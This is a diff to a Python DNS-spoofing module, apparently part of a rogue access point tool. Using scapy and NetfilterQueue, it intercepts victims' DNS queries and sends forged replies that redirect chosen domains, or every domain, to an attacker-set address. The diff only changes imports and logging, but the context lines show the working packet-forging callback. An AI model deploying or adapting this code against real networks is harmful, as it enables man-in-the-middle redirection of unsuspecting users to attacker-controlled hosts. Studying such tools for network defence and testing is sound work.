@@ -1,10 +1,9 @@
 #!/usr/bin/env python
 import argparse
 import logging
-from scapy.all import *
-from time import asctime
-from netfilterqueue import NetfilterQueue
 logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
+from scapy.all import *
+from netfilterqueue import NetfilterQueue
 
 """
 Description:
@@ -52,9 +51,9 @@ class DnsSpoofNetFilter(object):
         self.args = parser.parse_args()
 
     def logggingCreate(self):
-        setup_logger('dnsspoofAP', './logs/AccessPoint/DnsSpoofModuleReq.log')
+        setup_logger('dnsspoofAP', './logs/AccessPoint/dnsspoof.log')
         self.logDNS = logging.getLogger('dnsspoofAP')
-        self.logDNS.info('Dns Spoof: running... at: {}'.format(asctime()))
+        self.logDNS.info('Dns Spoof: running...')
 
     def callback(self,packet):
         payload = packet.get_payload()
@@ -63,7 +62,7 @@ class DnsSpoofNetFilter(object):
             packet.accept()
         else:
             if pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1] in self.domain:
-                self.logDNS.info('Target: {} -> ({}/DNS server) has searched for: {}'.format(pkt[IP].src,
+                self.logDNS.info('{} ->({}) has searched for: {}'.format(pkt[IP].src,
                 self.redirect,pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1]))
                 spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                 UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
@@ -73,7 +72,7 @@ class DnsSpoofNetFilter(object):
                 send(spoofed_pkt,verbose=False)
                 packet.accept()
             elif len(self.domain) == 1 and self.domain[0] == '':
-                self.logDNS.info('Target: {} -> ({}/DNS server) has searched for: {}'.format(pkt[IP].src,
+                self.logDNS.info('{} ->({}) has searched for: {}'.format(pkt[IP].src,
                 self.redirect,pkt[DNS].qd.qname[:len(str(pkt[DNS].qd.qname))-1]))
                 spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                 UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
